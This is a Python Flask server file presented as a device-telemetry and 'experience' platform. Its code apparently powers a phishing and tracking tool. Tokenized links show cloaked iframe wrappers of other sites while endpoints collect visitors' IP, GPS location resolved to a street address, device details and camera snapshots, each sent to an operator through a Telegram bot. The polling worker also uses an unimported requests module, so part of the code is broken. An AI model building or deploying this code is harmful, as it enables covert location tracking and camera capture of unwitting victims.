"""
server.py - Production-ready Flask server & Telegram Bot for interactive experiences and device telemetry.
"""

import sys
import time
import logging
import threading
from typing import Dict, Any
from flask import (
    Flask,
    request,
    jsonify,
    render_template,
    send_from_directory,
    abort
)
from werkzeug.utils import secure_filename

import config
from storage.json_store import JsonSessionStore
from services.session_service import SessionService
from services.telemetry_service import TelemetryService
from services.geo_service import GeoService
from services.media_service import MediaService
from services.event_service import EventService
from services.telegram_service import TelegramService

# ---------- Logging Setup ----------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
logger = logging.getLogger("server")

# ---------- App & Service Initialization ----------
app = Flask(__name__, template_folder="templates", static_folder="static")
app.config["SECRET_KEY"] = config.SECRET_KEY
app.config["MAX_CONTENT_LENGTH"] = config.MAX_UPLOAD_SIZE_BYTES

# Wire dependencies
session_store = JsonSessionStore(config.SESSIONS_FILE)
session_service = SessionService(session_store)
event_service = EventService(session_store)
telegram_service = TelegramService(session_service)

# Periodic cleanup of expired sessions
session_store.cleanup_expired()


# ---------- Security Headers ----------
@app.after_request
def apply_security_headers(response):
    response.headers["X-Content-Type-Options"] = "nosniff"
    # Allow iframing only for wrapped endpoints
    if not request.path.startswith("/w/"):
        response.headers["X-Frame-Options"] = "SAMEORIGIN"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    return response


# ---------- Error Handlers ----------
@app.errorhandler(400)
def bad_request_handler(e):
    return jsonify({"error": "bad_request", "message": str(e)}), 400


@app.errorhandler(404)
def not_found_handler(e):
    return jsonify({"error": "not_found", "message": "Resource not found"}), 404


@app.errorhandler(413)
def request_entity_too_large(e):
    return jsonify({"error": "payload_too_large", "message": "File exceeds maximum size"}), 413


@app.errorhandler(500)
def internal_error_handler(e):
    logger.error(f"Internal server error: {e}", exc_info=True)
    return jsonify({"error": "internal_error", "message": "An unexpected error occurred"}), 500


# ---------- Public & Experience Routes ----------
@app.route("/")
def index():
    return jsonify({
        "status": "online",
        "service": "Device Telemetry & Experience Platform",
        "version": "2.0.0",
        "available_experiences": len(config.EXPERIENCES)
    }), 200


@app.route("/s/<token>")
def session_page(token):
    """Render the configured experience for a session."""
    valid, reason, session = session_service.validate_active_session(token)
    if not valid or not session:
        return render_template("session.html",
            token=token,
            experience_name="Session Unavailable",
            experience="error",
            experience_template="experiences/custom.html"
        ), 404 if reason == "Session not found" else 403

    exp_id = session.get("experience", config.DEFAULT_EXPERIENCE)
    exp_meta = config.EXPERIENCES.get(exp_id, config.EXPERIENCES[config.DEFAULT_EXPERIENCE])

    # If experience is wrapper, redirect to wrapper route
    if exp_id == "wrapped_website":
        return wrapper_page(token)

    return render_template(
        "session.html",
        token=token,
        experience=exp_id,
        experience_name=exp_meta["name"],
        experience_template=exp_meta["template"]
    )


@app.route("/w/<token>")
def wrapper_page(token):
    """Render the iframe cloaked wrapper for an external site."""
    valid, reason, session = session_service.validate_active_session(token)
    if not valid or not session:
        return f"<h3>Session {reason}</h3>", 404 if reason == "Session not found" else 403

    target_url = session.get("target_url") or "https://example.com"
    return render_template("wrapper.html", token=token, target_url=target_url)


@app.route("/session_config/<token>")
def session_config(token):
    """API endpoint providing client with its session configuration."""
    session = session_service.get_session(token)
    if not session:
        return jsonify({"error": "not_found"}), 404

    return jsonify({
        "token": session["token"],
        "status": session.get("status", "active"),
        "experience": session.get("experience"),
        "label": session.get("label"),
        "expires_at": session.get("expires_at")
    })


# ---------- Telemetry & Media Ingestion ----------
@app.route("/upload_info/<token>", methods=["POST"])
def upload_info(token):
    """Ingest hardware specifications, battery, network, and location."""
    valid, reason, session = session_service.validate_active_session(token)
    if not valid or not session:
        return jsonify({"error": "invalid_session", "reason": reason}), 403

    payload = request.get_json(silent=True) or {}
    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    # Normalize incoming telemetry
    telemetry = TelemetryService.process_telemetry(payload, raw_ip)

    # GeoIP and Reverse Geocoding
    geo = GeoService.lookup_ip(telemetry["ip"])
    address = None
    if telemetry.get("coords"):
        coords = telemetry["coords"]
        address = GeoService.reverse_geocode(coords["lat"], coords["lon"])

    # Record visit
    visit_record = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "ip": telemetry["ip"],
        "battery": telemetry.get("battery"),
        "coords": telemetry.get("coords"),
        "address": address,
        "geo": geo,
        "os": telemetry.get("os"),
        "device_model": telemetry.get("device_model")
    }

    session.setdefault("visits", []).append(visit_record)
    session["telemetry"] = telemetry
    session_store.save(token, session)

    # Dispatch Telegram notification
    telegram_service.notify_telemetry(session, telemetry, geo, address)

    return jsonify({"status": "ok", "recorded": True})


@app.route("/upload_image/<token>", methods=["POST"])
def upload_image(token):
    """Ingest camera frame snapshot."""
    valid, reason, session = session_service.validate_active_session(token)
    if not valid or not session:
        return jsonify({"error": "invalid_session", "reason": reason}), 403

    data = request.get_json(silent=True) or {}
    b64 = data.get("image_b64")

    ok, msg, filename = MediaService.save_base64_image(token, b64)
    if not ok or not filename:
        return jsonify({"error": "upload_failed", "message": msg}), 400

    # Save to session
    session.setdefault("media", []).append(filename)
    session_store.save(token, session)

    # Send photo to Telegram
    photo_path = str(config.UPLOAD_DIR / filename)
    caption_details = f"IP: {request.remote_addr}"
    telegram_service.notify_photo(session, photo_path, caption_details=caption_details)

    return jsonify({"status": "ok", "filename": filename})


@app.route("/upload_photo/<token>", methods=["POST"])
def upload_photo(token):
    """Ingest user-selected media file."""
    valid, reason, session = session_service.validate_active_session(token)
    if not valid or not session:
        return jsonify({"error": "invalid_session", "reason": reason}), 403

    data = request.get_json(silent=True) or {}
    b64 = data.get("image_b64")

    ok, msg, filename = MediaService.save_base64_image(token, b64)
    if not ok or not filename:
        return jsonify({"error": "upload_failed", "message": msg}), 400

    session.setdefault("media", []).append(filename)
    session_store.save(token, session)

    photo_path = str(config.UPLOAD_DIR / filename)
    telegram_service.notify_photo(session, photo_path, caption_details="User uploaded photo file.")

    return jsonify({"status": "ok", "filename": filename})


@app.route("/event/<token>", methods=["POST"])
def log_event_route(token):
    """Log a gameplay or lifecycle event."""
    valid, reason, session = session_service.validate_active_session(token)
    if not valid or not session:
        return jsonify({"error": "invalid_session", "reason": reason}), 403

    data = request.get_json(silent=True) or {}
    event_name = data.get("event", "GENERIC_EVENT")
    metadata = data.get("metadata", {})

    event_service.log_event(token, event_name, metadata)
    return jsonify({"status": "ok"})


@app.route("/session_exit/<token>", methods=["POST"])
def session_exit(token):
    """Handle beacon signal on tab or browser exit."""
    session = session_service.get_session(token)
    if session:
        event_service.log_event(token, "SESSION_EXITED")
    return jsonify({"status": "ok"}), 200


@app.route("/session_data/<token>")
def session_data(token):
    """Retrieve raw session JSON data."""
    session = session_service.get_session(token)
    if not session:
        return jsonify({"error": "not_found"}), 404
    return jsonify(session)


@app.route("/uploads/<filename>")
def serve_upload(filename):
    """Safely serve media uploads with security headers."""
    safe_name = secure_filename(filename)
    if safe_name != filename:
        abort(404)
    return send_from_directory(config.UPLOAD_DIR, safe_name)


# ---------- Telegram Webhook Endpoint ----------
@app.route(f"/telegram/{config.TELEGRAM_WEBHOOK_SECRET}", methods=["POST"])
def telegram_webhook():
    """Webhook entry point for incoming Telegram updates."""
    if not config.TELEGRAM_BOT_TOKEN:
        return "Bot token not configured", 503

    update = request.get_json(silent=True)
    if not update:
        return "Invalid payload", 400

    # Process asynchronously or in-memory without loopback HTTP calls
    telegram_service.process_update(update)
    return "ok", 200


# ---------- Background Polling Worker for Local Development ----------
def run_telegram_polling():
    """
    Long-polling worker allowing developers to test the Telegram bot locally
    without needing a public webhook URL or tunnel.
    """
    token = config.TELEGRAM_BOT_TOKEN
    if not token:
        logger.info("No TELEGRAM_BOT_TOKEN set, skipping polling worker.")
        return

    logger.info("Starting Telegram Bot long-polling worker in background...")
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{token}/getUpdates"
            params = {"offset": offset, "timeout": 25}
            resp = requests.get(url, params=params, timeout=30)
            if resp.ok:
                data = resp.json()
                for update in data.get("result", []):
                    offset = update["update_id"] + 1
                    telegram_service.process_update(update)
            else:
                time.sleep(3)
        except Exception as e:
            logger.debug(f"Polling check exception (normal during network changes): {e}")
            time.sleep(4)


# ---------- Main Execution ----------
if __name__ == "__main__":
    # If --poll flag or POLLING_MODE env is set, launch polling worker in background thread
    if "--poll" in sys.argv or "--polling" in sys.argv:
        poll_thread = threading.Thread(target=run_telegram_polling, daemon=True)
        poll_thread.start()

    logger.info(f"Starting server on 0.0.0.0:{config.PORT} (Debug: {config.FLASK_DEBUG})")
    app.run(host="0.0.0.0", port=config.PORT, debug=config.FLASK_DEBUG)
